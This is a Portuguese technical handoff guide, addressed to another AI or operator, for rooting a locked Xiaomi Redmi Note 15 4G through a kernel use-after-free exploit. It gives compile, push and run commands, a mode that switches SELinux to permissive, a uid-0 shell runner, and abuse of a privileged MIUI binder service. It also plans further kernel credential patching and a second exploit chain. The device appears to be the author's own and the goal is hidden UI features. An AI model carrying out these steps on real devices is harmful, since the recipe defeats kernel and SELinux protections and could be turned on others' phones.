# Root no Redmi Note 15 4G (spinel) — guia técnico completo

> Documento de referência para outra IA/operador continuar o trabalho.
> Tudo aqui foi **verificado empiricamente** neste device. Onde marco `[!]`, é
> inferência/hipótese.

---

## 1. Identificação do alvo

| Item | Valor |
|---|---|
| Device | Xiaomi Redmi Note 15 4G, codinome **spinel** (`2510DRA23L`) |
| Serial adb | `kbrov8pjvw89kbqg` |
| Build | `OS3.0.303.0.WPGMIXM`, Android 16 |
| Kernel | `6.12.69-android16-6-g014ca48a80ee-ab15889839-4k` (GKI 6.12) |
| SoC | MediaTek (MT6789) |
| Bootloader | **locked** + AVB/dm-verity ativo (sem custom boot img) |
| adb (usar este!) | `C:\Users\patri\AppData\Local\Android\Sdk\platform-tools\adb.exe` |
| NDK | `C:\Users\patri\AppData\Local\Android\Sdk\ndk\28.2.13676358` |
| Workspace | `C:\Users\patri\Desktop\Nova pasta` |

O `adb.exe` do PATH é **1.0.31 (antigo)** — não usar.

---

## 2. O que já existe pronto no workspace

| Caminho | O que é |
|---|---|
| `work/cve98260/timer/timer.c` | Exploit **YuKongA** (CVE-2026-98260), fork do código público. É o que **funciona** aqui. |
| `work/cve98260/timer/kbuilds/6.12.69-android16-6-g014ca48a80ee-ab15889839-4k.h` | Perfil do kernel spinel (offsets/símbolos). |
| `work/cve98260/timer/timer_spinel` | Binário arm64 compilado (312080 bytes) — **é o que roda no device**. |
| `src/ghostlock-a17/` | Port do **GhostLock (CVE-2026-43499)**. Já tem perfil spinel (`src/devices/spinel/offsets.h`) e `build_spinel.ps1`. **Não funciona no spinel ainda** (trava no route helper). |
| `rom/spinel_global_images_OS3.0.303.0.WPGMIXM_16.0/images/boot.img` | Boot.img **stock** do device (64 MB) — permite extrair kernel/BTF. |
| `work/HANDOFF.md` | Diário do trabalho (histórico completo). |

### Build do timer-yk (se precisar recompilar)

```powershell
$cc = "C:\Users\patri\AppData\Local\Android\Sdk\ndk\28.2.13676358\toolchains\llvm\prebuilt\windows-x86_64\bin\aarch64-linux-android35-clang.cmd"
& $cc -O2 -o "C:\Users\patri\Desktop\Nova pasta\work\cve98260\timer\timer_spinel" `
       "C:\Users\patri\Desktop\Nova pasta\work\cve98260\timer\timer.c" -I"…\timer"
```
(O `-I` aponta para a pasta do `timer.c`, que inclui `kbuilds.h` → `kbuilds/*.h`.)

---

## 3. Como obter root (receita testada)

O exploit dá **uid 0 (root)** num shell filho. Ele é **estocástico**: depende de acertar a janela de UAF (UAF de timer) — o "burst". Acertos típicos: 0,3 s a 13 s. Quando erra, fica plantado esperando (às vezes minutos) ou faz **miss** (deixa zombie retido).

### 3.1 Preparação

```powershell
$A = "C:\Users\patri\AppData\Local\Android\Sdk\platform-tools\adb.exe"
& $A -s kbrov8pjvw89kbqg push `
   "C:\Users\patri\Desktop\Nova pasta\work\cve98260\timer\timer_spinel" /data/local/tmp/timer-yk
& $A -s kbrov8pjvw89kbqg shell 'chmod 755 /data/local/tmp/timer-yk'
```

> ⚠️ **Sempre verificar md5 após push** (ver §7 — panic faz o f2fs rollback e *zera* arquivos pushed):
> ```powershell
> & $A -s kbrov8pjvw89kbqg shell 'md5sum /data/local/tmp/timer-yk'
> ```

### 3.2 Modo `perm` — SELinux permissive global (não dá root, mas relaxa o AVC)

```powershell
& $A -s kbrov8pjvw89kbqg shell "cd /data/local/tmp && ./timer-yk perm 2>&1"
```
Saída saudável:
```
[+] plant1 free_seen=1 burst hit=1 after 12379ms
[+] plant1 reaped status=0x9
[+] selinux enforcing cleared
[stage] uid=2000 enforce=Permissive
[+] done
```
Efeito: `getenforce` → `Permissive` **até o próximo reboot**. (Zeroa o byte `enforcing` do `selinux_state` global via o mesmo write arbitrário do exploit.)

### 3.3 Modo `shell` — root shell (uid 0)

```powershell
& $A -s kbrov8pjvw89kbqg shell "cd /data/local/tmp && printf 'sh /data/local/tmp/MEU_SCRIPT.sh\nexit\n' | ./timer-yk shell 2>&1"
```
O filho roda `sh -i` lendo do stdin. Confirmado por:
```
[child] woke uid=0 euid=2000
[child] setresgid(0)=0 errno=0
[+] child report uid=0 euid=2000 setuid(0)=0 errno=0 resuid=0/0/2000
```

### 3.4 Padrão "detached" (RECOMENDADO) — o PC não pode matar o exploit

Rodar o exploit direto no `adb shell` do PC é perigoso: se o comando do PC for interrompido (timeout do harness, queda de USB), o exploit morre no meio → **kernel panic** (mina). A solução é rodar **dentro do device**, desacoplado:

```sh
# /data/local/tmp/run_root_cmd.sh  (no device)
#!/system/bin/sh
cd /data/local/tmp || exit 1
SCRIPT="$1"
LOG=/data/local/tmp/root_cmd.log
: > $LOG
exec >>$LOG 2>&1
echo "=== run $(date) boot=$(cat /proc/sys/kernel/random/boot_id) script=$SCRIPT"
printf 'sh %s\nexit\n' "$SCRIPT" | ./timer-yk shell 2>&1
echo "=== RUN_CMD_DONE"
```
Lançar e depois só ler o log:
```powershell
& $A -s kbrov8pjvw89kbqg shell 'cd /data/local/tmp && nohup setsid /data/local/tmp/run_root_cmd.sh /data/local/tmp/MEU_SCRIPT.sh >/dev/null 2>&1 &'
# ... depois:
& $A -s kbrov8pjvw89kbqg shell 'cat /data/local/tmp/root_cmd.log'
```

### 3.5 Regras que quebram o device (ler antes de mexer)

1. **NUNCA matar o processo do exploit** (SIGTERM/SIGKILL/pkill) → panic.
2. **Miss** (o exploit imprime `plant1 burst missed; holding zombie`) → fica com **zombie retido**; não reexecutar o exploit por cima dele. A única limpeza segura é **reboot limpo**.
3. Run em **foreground do harness** com timeout curto = morte garantida do exploit. Preferir detached (§3.4) ou timeout generoso (≥420 s).
4. **Reboot limpo** é a única forma de limpar zombie/exploit plantado.
5. Depois de panic, o **rollback do f2fs** em `/data` pode **reverter/zerear** arquivos (scripts pushados, o `persistent_properties`). Sempre re-push + **md5** após reboot.

---

## 4. O que o root faz e o que NÃO faz

| | |
|---|---|
| **Tem** | `uid=0`, `gid=0`, leitura/escrita de arquivos de root, acesso a `/proc/*`, `/sys`, `/data` (subject to DAC), `/dev/block/*`, instalar apps, matar processos, ptrace em apps. |
| **Não tem** | **Capacidades**: `CapEff=0000000000000000` → sem `CAP_DAC_OVERRIDE`, sem `CAP_SYS_ADMIN`. Consequência: não consegue criar arquivos em `/data/local/tmp` (dono é `shell`) nem abrir a property area para escrita. |
| **Contexto SELinux** | `u:r:shell:s0` (o exploit escreve `cred->security` com o SID de kernel, mas o **contexto da task** continua shell → o AVC usa o contexto da task). |
| **Por que `setprop persist.sys.*` falha** | O property service (init) checa o contexto do **peer** da socket (`u:r:shell:s0` → `u:object_r:system_prop:s0`) e **nega com `permissive=0`** — ou seja, o check é forçado em enforcing, então **permissive não resolve** (confirmado no dmesg: `avc: denied { set } ... permissive=0`). `debug.*` e `persist.sys.enable_sched_gpu_threads` (já existentes) são settable pelo shell; `ro.*` e `persist.sys.*` (novos) não. |

---

## 5. Android 16: áreas de propriedade por contexto (mapa completo)

O `/dev/__properties__` é um **diretório** (modo 0755, root) com:

```
/dev/__properties__/property_info              203304 B   (tabela de contextos)
/dev/__properties__/properties_serial          131072 B   (seriais)
/dev/__properties__/u:object_r:<ctx>_prop:s0  131072 B   (uma área por contexto SELinux)
```
As 6 props-alvo vivem em **`/dev/__properties__/u:object_r:system_prop:s0`** (mode **0444**).

### 5.1 Layout da entrada (verificado byte a byte)

```
[nome-ou-sufixo][NUL][pad 4B][u16 nextNameLen][u32 X][u32 Y][u32 0]
[próximo nome/sufixo][NUL][pad][u8 value_len][valor][NUL]
```
- O **nome** é comprimido: o prefixo comum vem do nome anterior (ex.: `persist.sys.` compartilhado; `support_view_mishadow` sozinho).
- O **valor** vem inline logo após o byte de comprimento; `value_len` == `strlen(valor)` (confirmado em 130/130 casos).
- Offsets (neste boot, área system_prop): `support_view_mishadow`@20968 (valor@20995), `support_view_smoothcorner`@21144 (21175), `support_window_mishadow`@21328 (21355), `support_window_smoothcorner`@21504 (21535), `freeform_hwui_corner_supported`@36480 (36515), `freeform_hwui_shadow_supported`@36680 (36715). **Recalcular a cada boot** (mudam um pouco).

### 5.2 Anti-tamper do property service (descoberta importante)

> O property service **recusa servir uma área cujo arquivo está gravável**.
> Depois de `chmod 0666` na área, **todas** as props dela voltaram vazias (getprop → nada);
> ao restaurar `chmod 0444`, voltaram ao normal.
> ⇒ **NUNCA mudar o mode da área.** E o valor original não volta a ser servido mesmo
> depois de restaurar os bytes — o serviço "desconfia" da área alterada.

### 5.3 Caminhos de escrita testados

| Caminho | Resultado |
|---|---|
| `open(area, O_RDWR)` + mmap PROT_WRITE | **bloqueado** (mode 0444, sem CAP_DAC_OVERRIDE) |
| `open(area, O_RDONLY)` + mmap PROT_READ + `pwrite` em `/proc/self/mem` | **EIO** (mapping compartilhado read-only não aceita FOLL_FORCE) |
| `pwrite` em `/proc/<pid>/mem` do processo que mapeia a área | **EIO** (idem) |
| `setprop` (qualquer contexto que tenhas) | negado pelo AVC para `persist.sys.*` |

**Workaround testado que funciona** (o que o vídeo do YouTube faz): o serviço **MIUI MQS** (§6).

---

## 6. Serviço MIUI MQS — o caminho do vídeo (o mais promissor)

O vídeo do canal **Blintech** (@blintech4805, "Ative Agora - Texturas Avançadas, Recentes iOS, Blur em Low Ram, Recursos Tops - Poco, Redmi & Mi") usa comandos `service call miui.mqsas.IMQSNative ...` — um **serviço privilegiado do MIUI** que executa comandos por nós.

### 6.1 O que é

- Daemon: **`/system_ext/bin/hypsys_system`** (init: `service hypsys_system`, `user root`, `group system root cache log everybody product_hyperengine`).
- Contexto do processo: **`u:r:kernel:s0`** (lê-se em `/proc/<pid>/attr/current`) → privilégio máximo.
- Binder: `miui.mqsas.IMQSNative` (pid 266 neste boot).
- Binário analisado: `work/hypsys_system` (824952 bytes). Strings-chave:
  - `captureLogByRunCommand: Shell user (UID %d) access denied`
  - `captureLogByRunCommand:341: No valid commands found`
  - `Command not allowed for shell user`
  - `runCommand: Shell user (UID %d) access denied`
  - `mqsasd cmdtool *** sigprocmask failed: %s`

### 6.2 Transação 21 = `captureLogByRunCommand`

Formato usado no vídeo:
```
service call miui.mqsas.IMQSNative 21 i32 1 s16 "<cmd>" i32 1 s16 "<args>" s16 "<logPath>" i32 600
```
- O **3º argumento (i32) precisa ser 1** (0 → erro "Parcel...", 2/3 → erro -4).
- **Caller precisa de UID ≠ 2000**: do shell (uid 2000) → `Command not allowed for shell user`; **do nosso root (uid 0) → passa** ✓.

### 6.3 Whitelist de comandos (brute-force do nome)

Aceitos (retorno = parcel vazia, sem erro):
```
prop        getprop       dumpsys       logcat
```
Rejeitados com `No valid commands found`: `setprop`, `setProp`, `property`, `sysprop`, `sh`, `cmd`, `exec`, `run`, `su`, `am`, `pm`, `captureLog`, `mqsas`, `runCommand`, …

⚠️ **Nesta versão o "setprop" do vídeo foi removido da whitelist — "prop" é o substituto.**

### 6.4 Estado atual (bloqueio)

Com `cmd="prop"` e `args="<nome> <valor>"` o serviço **retorna sucesso mas não faz nada**:
- não cria o arquivo de log que informamos;
- a prop não muda (ex.: `persist.sys.computility.cpulevel` continua `2`);
- `debug.hwui.disable_advanced_features` (controle) fica **vazio** → sugere que o serviço *apagou*/zerou a prop, não setou o valor.

Formatos testados (todos retornam "sucesso" sem efeito): `"nome valor"`, `"set nome valor"`, `"nome=valor"`, `"prop nome valor"`, `"setprop nome valor"`, `"-s nome valor"`, `i32=2/3`, `"nome"`+`"valor"` em posições trocadas, log em `/data/local/tmp` vs `/storage/emulated/0`.

**Próximo passo sugerido**: decodificar o `onTransact` do `BnMQSNative` (AIDL C++) em `work/hypsys_system` para achar a assinatura real do método e o formato de `args` do comando `prop`.
Dica: o `.dis` precisa ser lido como **UTF-16** (o `>` do PowerShell grava UTF-16) — foi justamente o que escondeu as referências `adrp`/`adr` às strings.

### 6.5 As 4 props do vídeo (o objetivo)

```
persist.sys.computility.cpulevel      = 6     (nível de CPU)
persist.sys.computility.gpulevel      = 6     (nível de GPU)
persist.sys.advanced_visual_release   = 3     ("texturas avançadas")
persist.sys.background_blur_supported  = true (blur em low RAM)
```
Comandos originais do vídeo:
```
service call miui.mqsas.IMQSNative 21 i32 1 s16 "setprop" i32 1 s16 "persist.sys.computility.cpulevel 6" s16 "/storage/emulated/0/log.txt" i32 600
service call miui.mqsas.IMQSNative 21 i32 1 s16 "setprop" i32 1 s16 "persist.sys.computility.gpulevel 6" s16 "/storage/emulated/0/log.txt" i32 600
service call miui.mqsas.IMQSNative 21 i32 1 s16 "setprop" i32 1 s16 "persist.sys.advanced_visual_release 3" s16 "/storage/emulated/0/log.txt" i32 600
service call miui.mqsas.IMQSNative 21 i32 1 s16 "setprop" i32 1 s16 "persist.sys.background_blur_supported true" s16 "/storage/emulated/0/log.txt" i32 600
```
→ nesta build trocar `"setprop"` por `"prop"` (e possivelmente ajustar os args).

**Leitura das props pelo shell** (atenção): `persist.sys.advanced_visual_release` e `persist.sys.background_blur_supported` **não existem** na área → `getprop` devolve **vazio** (não é "denied"). `persist.sys.computility.cpulevel`/`gpulevel` existem = **2**.

---

## 7. Armadilhas do ambiente (aprendidas na prática)

1. **Push pode virar arquivo de NULs** após um panic (rollback do f2fs). Sintoma: script não produz output nenhum. Sempre `md5sum` após push; se divergir, re-push.
2. **O `adb server` da máquina cai sozinho** com frequência (não é panic). Reconectar leva ~25 s. Para distinguir: **o boot_id** é o árbitro (`cat /proc/sys/kernel/random/boot_id`).
3. **`getprop` vazio** pode significar "prop não existe" OU "sem permissão de leitura" — conferir com `grep -abo <prop> /dev/__properties__/u:object_r:system_prop:s0` (via root).
4. **Quoting PowerShell→adb→sh**: aspas duplas se perdem. Para comandos com aspas, **usar arquivo de script** (push + `sh script.sh`), nunca inline.
5. **grep com `|` no padrão** no shell do Android: o `|` é interpretado pelo shell. Usar padrão sem `|` ou script.
6. `/data/local/tmp` é do usuário `shell` → nosso root (uid 0 **sem caps**) **não** consegue criar arquivo lá (DAC). Usar `/data/local/tmp` só para o que o `shell` criou/pushou; para saída do root, gravar em `/data/` (também bloqueado) → melhor: **escrever em arquivo já existente** ou usar o log do `run_root_cmd.sh` (stdout).
7. `/storage/emulated/0` (sdcard) é FUSE: arquivo criado pelo root fica 0600 root → shell não lê; root **também** não lê (negado pelo FUSE).

---

## 8. Rotas alternativas já avaliadas

### 8.1 Patch de `task->security` → shell `u:r:kernel:s0` (recomendado)
O exploit (YuKongA, modo `fake`) já monta um blob de contexto com o **SID de kernel** (`SELINUX_SID_KERNEL`) e o coloca em `cred->security`. Falta apontar **`task->security`** para o mesmo blob → o contexto da *task* passa a ser `u:r:kernel:s0` → o property service aceitaria `setprop persist.sys.*` (e gravaria no arquivo de persistência).
- Precisa do offset de `task_struct.security`.
- Offset pode sair do **BTF** do kernel stock: temos `rom/.../images/boot.img` (kernel GKI com BTF embutido na Image).
- O perfil spinel já dá `task_cred = 0x900` (= o `cred_uid_off` do nosso perfil ✓), `task_real_cred=0x8F8`, `task_seccomp=0x9C8`.
- Ferramenta PC pronta (parcial): `work/btf_task.py` (extrai BTF do boot.img e procura `task_struct.security`). **Precisa ser ajustado**: o boot.img é header **v4** (page_size=0) e o kernel é *raw Image* (sem tabela de seções ELF) → o BTF está embutido e se localiza pelo **magic 0xEB9F** (o script já tenta isso).

### 8.2 KernelSU (o app do vídeo)
O **manager sozinho não dá root** — o KSU precisa de kernel com o hook dele:
- modo **LKM/GKI**: o módulo `.ko` precisaria carregar no kernel stock → bloqueado por `CONFIG_MODULE_SIG_FORCE` (assinatura de módulo).
- modo **build completo**: exige *source* do kernel + **bootloader desbloqueado** (Mi Unlock, ~168 h) → repack do `boot.img` com KSU e flash via fastboot. Aí sim: `su` real para qualquer app e as props viram triviais (`su -c setprop …`).
- Alternativa intermediária: o **boot.img stock já está no PC** → dá para repackar com KSU quando o bootloader for destravado.

### 8.3 GhostLock (CVE-2026-43499) no spinel
Projeto pronto em `src/ghostlock-a17` com perfil spinel completo, mas o chain **trava** no estágio "route helper" (`cycle NOT formed` — a corrida pselect/PI-futex não fecha). Se funcionar, dá `uid=0` + **`u:r:kernel:s0`** + daemon `g4d`/`g4sh` (socket abstrato `@ghostlockd`) = root persistente por boot, o que resolveria "root na hora que eu quiser, sem PC".

### 8.4 Other: escrita direta na property area
Continua sem caminho viável por DAC (mode 0444 + sem caps) — e, mesmo escrevendo, o serviço descarta a área alterada (§5.2).

---

## 9. Root "na hora que eu quiser", sem PC (situação atual)

O exploit roda **no próprio aparelho**, a partir de qualquer shell **uid 2000** — que é o que o **Shizuku** entrega (serviço Shizuku = uid 2000, contexto `u:r:shell:s0`, igual ao adb shell). É exatamente o fluxo do vídeo (Shizuku + exploit + comandos), com YuKongA no lugar do GhostLock.

Scripts para deixar no device (`/data/local/tmp/`):
- `root.sh` — root shell interativo:
  ```sh
  #!/system/bin/sh
  cd /data/local/tmp || exit 1
  printf 'id\ncat /proc/self/attr/current\nexec /system/bin/sh -i\n' | ./timer-yk shell
  ```
- `features_on.sh` — root + patch das props (o caminho da §6 / §8.1).
- `run_root_cmd.sh` — wrapper detached (§3.4).

**Cópia de segurança**: como um panic faz rollback de `/data`, manter cópia do `timer-yk` e dos scripts em `/sdcard/Download/` (fora do rollback) e re-pushar após o reboot.

Para um toque na tela: app Android mínimo usando a **API do Shizuku** (roda o script como uid 2000) — o `ShizukuUserService`/`Shizuku.newProcess`. Alternativa: Termux + widget/shortcut chamando `shizuku /data/local/tmp/features_on.sh`.

---

## 10. Checklist rápido (o que fazer agora)

1. `md5sum` de tudo que estiver em `/data/local/tmp` → re-push do que estiver zerado.
2. Rodar o exploit **detached** (§3.4) com um script que:
   - testa `service call miui.mqsas.IMQSNative 21 i32 1 s16 "prop" …` (variar o formato dos args);
   - ou aplica o patch de `task->security` (§8.1) e aí usa `setprop` normal.
3. Se `setprop` passar: setar as 4 props do vídeo + (opcionalmente) as 6 do Control Center:
   ```
   persist.sys.support_view_mishadow / _smoothcorner
   persist.sys.support_window_mishadow / _smoothcorner
   persist.sys.device.freeform_hwui_corner_supported / _shadow_supported
   ```
4. Reiniciar o SystemUI para os apps relerem as props: `adb shell killall com.android.systemui`.
5. Persistência: o property service grava no `persistent_properties` → o valor **sobrevive a reboot limpo** (a menos que algum componente do MIUI reescreva em runtime — o "forcer" que coloca `false` ainda **não foi identificado**: nenhum binário do sistema tem o literal dessas props, só leitores).
   - Leitores conhecidos: `android.view.ViewRootImpl` (framework.jar/classes4.dex), `miuix.smooth.SmoothCornerHelper` (miuix.jar), `MultiTaskingCornerShadowController` (MiuiSystemUI), `libhwui.so`, `libsurfaceflinger.so`.
   - `/system_ext/etc/build.prop` (linhas 84-88) declara essas props como **true** → é o valor "de fábrica" desejado.
